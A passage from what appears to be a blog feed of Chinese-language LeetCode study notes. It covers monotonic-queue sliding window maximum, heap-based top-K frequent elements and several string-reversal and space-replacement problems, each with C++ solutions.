type="1"><li>pop(value)：如果窗口移除的元素value等于单调队列的出口元素，那么队列弹出元素，否则不用任何操作</li><li>push(value)：如果push的元素value大于入口元素的数值，那么就将队列入口的元素弹出，直到push元素的数值小于等于队列入口元素的数值为止</li></ol><p>保持如上规则，每次窗口移动的时候，只要问que.front()就可以返回当前窗口的最大值。</p><p>nums = [1,3,-1,-3,5,3,6,7], 和 k = 3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyQueue</span> &#123; <span class="hljs-comment">//单调队列（从大到小）</span><br><span class="hljs-keyword">public</span>:<br>    deque&lt;<span class="hljs-type">int</span>&gt; que; <span class="hljs-comment">// 使用deque来实现单调队列</span><br>    <span class="hljs-comment">// 每次弹出的时候，比较当前要弹出的数值是否等于队列出口元素的数值，如果相等则弹出。</span><br>    <span class="hljs-comment">// 同时pop之前判断队列当前是否为空。</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!que.<span class="hljs-built_in">empty</span>() &amp;&amp; value == que.<span class="hljs-built_in">front</span>()) &#123;<br>            que.<span class="hljs-built_in">pop_front</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 如果push的数值大于入口元素的数值，那么就将队列后端的数值弹出，直到push的数值小于等于队列入口元素的数值为止。</span><br>    <span class="hljs-comment">// 这样就保持了队列里的数值是单调从大到小的了。</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> </span>&#123;<br>        <span class="hljs-keyword">while</span> (!que.<span class="hljs-built_in">empty</span>() &amp;&amp; value &gt; que.<span class="hljs-built_in">back</span>()) &#123;<br>            que.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br>        que.<span class="hljs-built_in">push_back</span>(value);<br><br>    &#125;<br>    <span class="hljs-comment">// 查询当前队列里的最大值 直接返回队列前端也就是front就可以了。</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">front</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> que.<span class="hljs-built_in">front</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyQueue</span> &#123; <span class="hljs-comment">//单调队列（从大到小）</span><br>    <span class="hljs-keyword">public</span>:<br>        deque&lt;<span class="hljs-type">int</span>&gt; que; <span class="hljs-comment">// 使用deque来实现单调队列</span><br>        <span class="hljs-comment">// 每次弹出的时候，比较当前要弹出的数值是否等于队列出口元素的数值，如果相等则弹出。</span><br>        <span class="hljs-comment">// 同时pop之前判断队列当前是否为空。</span><br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> </span>&#123;<br>            <span class="hljs-keyword">if</span> (!que.<span class="hljs-built_in">empty</span>() &amp;&amp; value == que.<span class="hljs-built_in">front</span>()) &#123;<br>                que.<span class="hljs-built_in">pop_front</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 如果push的数值大于入口元素的数值，那么就将队列后端的数值弹出，直到push的数值小于等于队列入口元素的数值为止。</span><br>        <span class="hljs-comment">// 这样就保持了队列里的数值是单调从大到小的了。</span><br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> </span>&#123;<br>            <span class="hljs-keyword">while</span> (!que.<span class="hljs-built_in">empty</span>() &amp;&amp; value &gt; que.<span class="hljs-built_in">back</span>()) &#123;<br>                que.<span class="hljs-built_in">pop_back</span>();<br>            &#125;<br>            que.<span class="hljs-built_in">push_back</span>(value);<br><br>        &#125;<br>        <span class="hljs-comment">// 查询当前队列里的最大值 直接返回队列前端也就是front就可以了。</span><br>        <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">front</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> que.<span class="hljs-built_in">front</span>();<br>        &#125;<br>    &#125;;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">maxSlidingWindow</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        MyQueue que;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) &#123; <span class="hljs-comment">// 先将前k的元素放进队列</span><br>            que.<span class="hljs-built_in">push</span>(nums[i]);<br>        &#125;<br>        result.<span class="hljs-built_in">push_back</span>(que.<span class="hljs-built_in">front</span>()); <span class="hljs-comment">// result 记录前k的元素的最大值</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = k; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            que.<span class="hljs-built_in">pop</span>(nums[i - k]); <span class="hljs-comment">// 滑动窗口移除最前面元素</span><br>            que.<span class="hljs-built_in">push</span>(nums[i]); <span class="hljs-comment">// 滑动窗口前加入最后面的元素</span><br>            result.<span class="hljs-built_in">push_back</span>(que.<span class="hljs-built_in">front</span>()); <span class="hljs-comment">// 记录对应的最大值</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="前k个高频元素">前k个高频元素</h1><p><a href="https://leetcode.cn/problems/top-k-frequent-elements/">347.前 K 个高频元素 - 力扣（LeetCode）</a></p><p><strong>堆是一棵完全二叉树，树中每个结点的值都不小于（或不大于）其左右孩子的值。</strong>如果父亲结点是大于等于左右孩子就是大顶堆，小于等于左右孩子就是小顶堆。</p><p>有的同学一想，题目要求前 K 个高频元素，那么果断用大顶堆啊。</p><p>那么问题来了，定义一个大小为k的大顶堆，在每次移动更新大顶堆的时候，每次弹出都把最大的元素弹出去了，那么怎么保留下来前K个高频元素呢。</p><p>而且使用大顶堆就要把所有元素都进行排序，那能不能只排序k个元素呢？</p><p><strong>所以我们要用小顶堆，因为要统计最大前k个元素，只有小顶堆每次将最小的元素弹出，最后小顶堆里积累的才是前k个最大元素。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 时间复杂度：O(nlogk)</span><br><span class="hljs-comment">// 空间复杂度：O(n)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 小顶堆</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">mycomparison</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">const</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&amp; lhs, <span class="hljs-type">const</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&amp; rhs)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> lhs.second &gt; rhs.second;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">topKFrequent</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-comment">// 要统计元素出现频率</span><br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; map; <span class="hljs-comment">// map&lt;nums[i],对应出现的次数&gt;</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            map[nums[i]]++;<br>        &#125;<br><br>        <span class="hljs-comment">// 对频率排序</span><br>        <span class="hljs-comment">// 定义一个小顶堆，大小为k</span><br>        priority_queue&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;, vector&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;, mycomparison&gt; pri_que;<br><br>        <span class="hljs-comment">// 用固定大小为k的小顶堆，扫面所有频率的数值</span><br>        <span class="hljs-keyword">for</span> (unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;::iterator it = map.<span class="hljs-built_in">begin</span>(); it != map.<span class="hljs-built_in">end</span>(); it++) &#123;<br>            pri_que.<span class="hljs-built_in">push</span>(*it);<br>            <span class="hljs-keyword">if</span> (pri_que.<span class="hljs-built_in">size</span>() &gt; k) &#123; <span class="hljs-comment">// 如果堆的大小大于了K，则队列弹出，保证堆的大小一直为k</span><br>                pri_que.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 找出前K个高频元素，因为小顶堆先弹出的是最小的，所以倒序来输出到数组</span><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">result</span><span class="hljs-params">(k)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = k - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            result[i] = pri_que.<span class="hljs-built_in">top</span>().first;<br>            pri_que.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>栈与队列</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>字符串</title>
    <link href="/2022/09/21/Algorithm/algorithm-4/"/>
    <url>/2022/09/21/Algorithm/algorithm-4/</url>
    
    <content type="html"><![CDATA[<p>本文为学习<ahref="https://programmercarl.com/">代码随想录</a>时所做的笔记，仅供学习参考，不做任何商业用途，若有侵权，请联系删除。</p><h1 id="反转字符串">反转字符串</h1><p><a href="https://leetcode.cn/problems/reverse-string/">344.反转字符串 - 力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reverseString</span><span class="hljs-params">(vector&lt;<span class="hljs-type">char</span>&gt;&amp; s)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = s.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &lt; s.<span class="hljs-built_in">size</span>()/<span class="hljs-number">2</span>; i++, j--) &#123;<br>            <span class="hljs-built_in">swap</span>(s[i],s[j]);<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><span id="more"></span><h1 id="反转字符串ii">反转字符串II</h1><p><a href="https://leetcode.cn/problems/reverse-string-ii/">541.反转字符串 II - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">reverseStr</span><span class="hljs-params">(string s, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i += (<span class="hljs-number">2</span> * k)) &#123;<br>            <span class="hljs-comment">// 1. 每隔 2k 个字符的前 k 个字符进行反转</span><br>            <span class="hljs-comment">// 2. 剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符</span><br>            <span class="hljs-keyword">if</span> (i + k &lt;= s.<span class="hljs-built_in">size</span>()) &#123;<br>                <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>() + i, s.<span class="hljs-built_in">begin</span>() + i + k );<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 3. 剩余字符少于 k 个，则将剩余字符全部反转。</span><br>                <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>() + i, s.<span class="hljs-built_in">end</span>());<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="剑指offer-05.替换空格">剑指Offer 05.替换空格</h1><p><a href="https://leetcode.cn/problems/ti-huan-kong-ge-lcof/">剑指Offer 05. 替换空格 - 力扣（LeetCode）</a></p><p>首先扩充数组到每个空格替换成"%20"之后的大小。</p><p>然后从后向前替换空格，也就是双指针法，过程如下：</p><p>i指向新长度的末尾，j指向旧长度的末尾。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">replaceSpace</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">// 统计空格的个数</span><br>        <span class="hljs-type">int</span> sOldSize = s.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                count++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 扩充字符串s的大小，也就是每个空格替换成&quot;%20&quot;之后的大小</span><br>        s.<span class="hljs-built_in">resize</span>(s.<span class="hljs-built_in">size</span>() + count * <span class="hljs-number">2</span>);<br>        <span class="hljs-type">int</span> sNewSize = s.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-comment">// 从后先前将空格替换为&quot;%20&quot;</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = sNewSize - <span class="hljs-number">1</span>, j = sOldSize - <span class="hljs-number">1</span>; j &lt; i; i--, j--) &#123;<br>            <span class="hljs-keyword">if</span> (s[j] != <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                s[i] = s[j];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                s[i] = <span class="hljs-string">&#x27;0&#x27;</span>;<br>                s[i - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;2&#x27;</span>;<br>                s[i - <span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;%&#x27;</span>;<br>                i -= <span class="hljs-number">2</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="翻转字符串里的单词">翻转字符串里的单词</h1><p><ahref="https://leetcode.cn/problems/reverse-words-in-a-string/">151.反转字符串中的单词 - 力扣（LeetCode）</a></p><ul><li>移除多余空格</li><li>将整个字符串反转</li><li>将每个单词反转</li></ul><p>举个例子，源字符串为："the sky is blue "</p><ul><li>移除多余空格 : "the sky is blue"</li><li>字符串反转："eulb si yks eht"</li><li>单词反转："blue is sky the"</li></ul><h2 id="移除空格">移除空格</h2><p>普通解法，时间复杂度高</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">removeExtraSpaces</span><span class="hljs-params">(string&amp; s)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = s.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">if</span> (s[i] == s[i - <span class="hljs-number">1</span>] &amp;&amp; s[i] == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>            s.<span class="hljs-built_in">erase</span>(s.<span class="hljs-built_in">begin</span>() + i);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 删除字符串最后面的空格</span><br>    <span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span> &amp;&amp; s[s.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>        s.<span class="hljs-built_in">erase</span>(s.<span class="hljs-built_in">begin</span>() + s.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">// 删除字符串最前面的空格</span><br>    <span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span> &amp;&amp; s[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>        s.<span class="hljs-built_in">erase</span>(s.<span class="hljs-built_in">begin</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>双指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//版本一 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">removeExtraSpaces</span><span class="hljs-params">(string&amp; s)</span> </span>&#123;<br>    <span class="hljs-type">int</span> slowIndex = <span class="hljs-number">0</span>, fastIndex = <span class="hljs-number">0</span>; <span class="hljs-comment">// 定义快指针，慢指针</span><br>    <span class="hljs-comment">// 去掉字符串前面的空格</span><br>    <span class="hljs-keyword">while</span> (s.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span> &amp;&amp; fastIndex &lt; s.<span class="hljs-built_in">size</span>() &amp;&amp; s[fastIndex] == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>        fastIndex++;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (; fastIndex &lt; s.<span class="hljs-built_in">size</span>(); fastIndex++) &#123;<br>        <span class="hljs-comment">// 去掉字符串中间部分的冗余空格</span><br>        <span class="hljs-keyword">if</span> (fastIndex - <span class="hljs-number">1</span> &gt; <span class="hljs-number">0</span><br>                &amp;&amp; s[fastIndex - <span class="hljs-number">1</span>] == s[fastIndex]<br>                &amp;&amp; s[fastIndex] == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            s[slowIndex++] = s[fastIndex];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (slowIndex - <span class="hljs-number">1</span> &gt; <span class="hljs-number">0</span> &amp;&amp; s[slowIndex - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27; &#x27;</span>) &#123; <span class="hljs-comment">// 去掉字符串末尾的空格</span><br>        s.<span class="hljs-built_in">resize</span>(slowIndex - <span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        s.<span class="hljs-built_in">resize</span>(slowIndex); <span class="hljs-comment">// 重新设置字符串大小</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 版本二 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">removeExtraSpaces</span><span class="hljs-params">(string&amp; s)</span> </span>&#123;<span class="hljs-comment">//去除所有空格并在相邻单词之间添加空格, 快慢指针。</span><br>    <span class="hljs-type">int</span> slow = <span class="hljs-number">0</span>;   <span class="hljs-comment">//整体思想参考https://programmercarl.com/0027.移除元素.html</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); ++i) &#123; <span class="hljs-comment">//</span><br>        <span class="hljs-keyword">if</span> (s[i] != <span class="hljs-string">&#x27; &#x27;</span>) &#123; <span class="hljs-comment">//遇到非空格就处理，即删除所有空格。</span><br>            <span class="hljs-keyword">if</span> (slow != <span class="hljs-number">0</span>) s[slow++] = <span class="hljs-string">&#x27; &#x27;</span>; <span class="hljs-comment">//手动控制空格，给单词之间添加空格。slow != 0说明不是第一个单词，需要在单词前添加空格。</span><br>            <span class="hljs-keyword">while</span> (i &lt; s.<span class="hljs-built_in">size</span>() &amp;&amp; s[i] != <span class="hljs-string">&#x27; &#x27;</span>) &#123; <span class="hljs-comment">//补上该单词，遇到空格说明单词结束。</span><br>                s[slow++] = s[i++];<br>            &#125;<br>        &#125;<br>    &#125;<br>    s.<span class="hljs-built_in">resize</span>(slow); <span class="hljs-comment">//slow的大小即为去除多余空格后的大小。</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="整体代码">整体代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reverse</span><span class="hljs-params">(string&amp; s, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> end)</span></span>&#123; <span class="hljs-comment">//翻转，区间写法：左闭又闭 []</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = start, j = end; i &lt; j; i++, j--) &#123;<br>            <span class="hljs-built_in">swap</span>(s[i], s[j]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">removeExtraSpaces</span><span class="hljs-params">(string&amp; s)</span> </span>&#123;<span class="hljs-comment">//去除所有空格并在相邻单词之间添加空格, 快慢指针。</span><br>        <span class="hljs-type">int</span> slow = <span class="hljs-number">0</span>;   <span class="hljs-comment">//整体思想参考https://programmercarl.com/0027.移除元素.html</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); ++i) &#123; <span class="hljs-comment">//</span><br>            <span class="hljs-keyword">if</span> (s[i] != <span class="hljs-string">&#x27; &#x27;</span>) &#123; <span class="hljs-comment">//遇到非空格就处理，即删除所有空格。</span><br>                <span class="hljs-keyword">if</span> (slow != <span class="hljs-number">0</span>) s[slow++] = <span class="hljs-string">&#x27; &#x27;</span>; <span class="hljs-comment">//手动控制空格，给单词之间添加空格。slow != 0说明不是第一个单词，需要在单词前添加空格。</span><br>                <span class="hljs-keyword">while</span> (i &lt; s.<span class="hljs-built_in">size</span>() &amp;&amp; s[i] != <span class="hljs-string">&#x27; &#x27;</span>) &#123; <span class="hljs-comment">//补上该单词，遇到空格说明单词结束。</span><br>                    s[slow++] = s[i++];<br>                &#125;<br>            &#125;<br>        &#125;<br>        s.<span class="hljs-built_in">resize</span>(slow); <span class="hljs-comment">//slow的大小即为去除多余空格后的大小。</span><br>    &#125;<br><br>    <span class="hljs-function">string <span class="hljs-title">reverseWords</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-built_in">removeExtraSpaces</span>(s); <span class="hljs-comment">//去除多余空格，保证单词之间之只有一个空格，且字符串首尾没空格。</span><br>        <span class="hljs-built_in">reverse</span>(s, <span class="hljs-number">0</span>, s.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>        <span class="hljs-type">int</span> start = <span class="hljs-number">0</span>; <span class="hljs-comment">//removeExtraSpaces后保证第一个单词的开始下标一定是0。</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= s.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>            <span 